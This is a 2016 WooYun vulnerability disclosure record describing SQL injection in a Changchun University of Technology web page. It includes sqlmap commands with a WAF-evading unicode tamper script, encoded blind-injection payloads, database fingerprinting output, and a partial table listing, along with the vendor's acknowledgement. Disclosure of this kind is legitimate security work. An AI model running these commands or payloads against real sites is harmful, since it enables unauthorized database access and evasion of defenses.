{"id": 85881, "wybug_id": "wooyun-2016-0193471", "wybug_title": "长春工业大学某站sql注入漏洞", "wybug_corp": "长春工业大学", "wybug_author": "路人甲", "wybug_date": "2016-04-07 14:36", "wybug_open_date": "2016-04-09 13:43", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-09：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： rt 详细说明：  \n注入点：http://etc.ccut.edu.cn/type.asp?id=1391注入参数：idsqlmap.py -u \"http://etc.ccut.edu.cn/type.asp?id=1391\" --tamper charunicodeencode.py -v 3[13:18:28] [PAYLOAD] %u0031%u0033%u0039%u0031%u0020%u0041%u004E%u0044%u0020%u0028%u0036%u0039%u0037%u0033%u0029%u003D%u0036%u0039%u0037%u0033[13:18:29] [PAYLOAD] %u0031%u0033%u0039%u0031%u0020%u0041%u004E%u0044%u0020%u0036%u0039%u0037%u0034%u003E%u0036%u0039%u0037%u0033GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection point(s) with a total of 83 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=1391 AND 7704=7704    Vector: AND [INFERENCE]---[13:18:35] [WARNING] changes made by tampering scripts are not included in shown payload content(s)[13:18:35] [INFO] testing MySQL[13:18:35] [PAYLOAD] %u0031%u0033%u0039%u0031%u0020%u0041%u004E%u0044%u0020%u0051%u0055%u0041%u0052%u0054%u0045%u0052%u0028%u004E%u0055%u004C%u004C%u0029%u0020%u0049%u0053%u0020%u004E%u0055%u004C%u004C[13:18:37] [WARNING] the back-end DBMS is not MySQL[13:18:37] [INFO] testing Oracle[13:18:37] [PAYLOAD] %u0031%u0033%u0039%u0031%u0020%u0041%u004E%u0044%u0020%u0052%u004F%u0057%u004E%u0055%u004D%u003D%u0052%u004F%u0057%u004E%u0055%u004D[13:18:38] [WARNING] the back-end DBMS is not Oracle[13:18:38] [INFO] testing PostgreSQL[13:18:38] [PAYLOAD] %u0031%u0033%u0039%u0031%u0020%u0041%u004E%u0044%u0020%u0033%u0037%u0033%u0033%u003A%u003A%u0069%u006E%u0074%u003D%u0033%u0037%u0033%u0033[13:18:40] [WARNING] the back-end DBMS is not PostgreSQL[13:18:40] [INFO] testing Microsoft SQL Server[13:18:40] [PAYLOAD] %u0031%u0033%u0039%u0031%u0020%u0041%u004E%u0044%u0020%u0053%u0051%u0055%u0041%u0052%u0045%u0028%u0038%u0032%u0037%u0032%u0029%u003D%u0053%u0051%u0055%u0041%u0052%u0045%u0028%u0038%u0032%u0037%u0032%u0029[13:18:41] [WARNING] the back-end DBMS is not Microsoft SQL Server[13:18:41] [INFO] testing SQLite[13:18:41] [PAYLOAD] %u0031%u0033%u0039%u0031%u0020%u0041%u004E%u0044%u0020%u004C%u0041%u0053%u0054%u005F%u0049%u004E%u0053%u0045%u0052%u0054%u005F%u0052%u004F%u0057%u0049%u0044%u0028%u0029%u003D%u004C%u0041%u0053%u0054%u005F%u0049%u004E%u0053%u0045%u0052%u0054%u005F%u0052%u004F%u0057%u0049%u0044%u0028%u0029[13:18:42] [WARNING] the back-end DBMS is not SQLite[13:18:42] [INFO] testing Microsoft Access[13:18:42] [PAYLOAD] %u0031%u0033%u0039%u0031%u0020%u0041%u004E%u0044%u0020%u0056%u0041%u004C%u0028%u0043%u0056%u0041%u0052%u0028%u0031%u0029%u0029%u003D%u0031[13:18:43] [INFO] confirming Microsoft Access[13:18:43] [PAYLOAD] %u0031%u0033%u0039%u0031%u0020%u0041%u004E%u0044%u0020%u0049%u0049%u0046%u0028%u0041%u0054%u004E%u0028%u0032%u0029%u003E%u0030%u002C%u0031%u002C%u0030%u0029%u0020%u0042%u0045%u0054%u0057%u0045%u0045%u004E%u0020%u0032%u0020%u0041%u004E%u0044%u0020%u0030[13:18:44] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windowsweb application technology: ASP.NET, ASPback-end DBMS: Microsoft Access\n   漏洞证明：  \n>sqlmap.py -u \"http://etc.ccut.edu.cn/type.asp?id=1391\" --tamper charunicodeencode.py -v 3 --tables --time-sec 5 -b         _ ___ ___| |_____ ___ ___  {1.0.0.14#dev}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 13:20:31[13:20:31] [DEBUG] cleaning up configuration parameters[13:20:31] [INFO] loading tamper script 'charunicodeencode'[13:20:31] [WARNING] tamper script 'charunicodeencode' is only meant to be run against ASP or ASP.NET web applications[13:20:31] [DEBUG] setting the HTTP timeout[13:20:31] [DEBUG] creating HTTP requests opener object[13:20:31] [INFO] resuming back-end DBMS 'microsoft access'[13:20:31] [DEBUG] resolving hostname 'etc.ccut.edu.cn'[13:20:31] [INFO] testing connection to the target URL[13:20:34] [DEBUG] declared web page charset 'gb2312'[13:20:34] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS/IDSsqlmap resumed the following injection point(s) from stored session:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=1391 AND 7704=7704    Vector: AND [INFERENCE]---[13:20:34] [WARNING] changes made by tampering scripts are not included in shown payload content(s)[13:20:34] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windowsweb application technology: ASP.NET, ASPback-end DBMS: Microsoft Access[13:20:34] [WARNING] on Microsoft Access it is not possible to get a bannerbanner: None[13:20:34] [INFO] fetching tables for database: 'Microsoft_Access_masterdb'[13:20:34] [INFO] fetching number of tables for database 'Microsoft_Access_masterdb'[13:20:34] [PAYLOAD] %u0031%u0033%u0039%u0031[13:29:13] [INFO] waiting for threads to finish (Ctrl+C was pressed)[13:29:32] [WARNING] user aborted during table existence check. sqlmap will display partial outputDatabase: Microsoft_Access_masterdb[2 tables]+--------+| config || news   |+--------+\n应该是还有一个表，没有继续跑下去了   修复方案：  sql注入你们肯定会   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2016-04-09 10:11 厂商回复： 马上处理谢谢 最新状态： 2016-04-09：暂时无法联系开发人员，因此将网站关闭，谢谢  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}